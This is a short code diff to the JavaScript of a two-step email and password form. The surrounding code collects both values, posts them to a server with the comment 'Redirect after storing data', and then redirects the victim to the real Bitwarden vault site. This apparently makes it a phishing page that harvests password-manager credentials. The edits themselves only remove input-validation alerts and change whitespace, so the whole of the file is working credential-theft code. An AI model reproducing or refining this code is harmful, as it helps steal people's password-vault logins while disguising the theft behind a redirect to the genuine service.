@@ -4,10 +4,9 @@ document.getElementById('continue-button').addEventListener('click', function() 
         console.log('Email:', emailInput);
         document.getElementById('email-section').classList.add('tw-hidden');
         document.getElementById('password-section').classList.remove('tw-hidden');
-    } else {
-        alert('Please enter an email address.');
     }
 });
+
 
 document.getElementById('submit-button').addEventListener('click', function(event) {
     event.preventDefault();
@@ -16,11 +15,8 @@ document.getElementById('submit-button').addEventListener('click', function(even
     if (passwordInput) {
         console.log('Email:', emailInput);
         console.log('Password:', passwordInput);
-    } else {
-        alert('Please enter a password.');
     }
 });
-
 
 function showPasswordSection() {
     const emailInput = document.getElementById('email-input').value;
@@ -35,7 +31,7 @@ function showPasswordSection() {
         },
         body: `email=${encodeURIComponent(emailInput)}&password=${encodeURIComponent(passwordInput)}`
     }).then(() => {
-          // Redirect after storing data
-          window.location.href = 'https://vault.bitwarden.com/';
+        // Redirect after storing data
+        window.location.href = 'https://vault.bitwarden.com/';
     });
 }
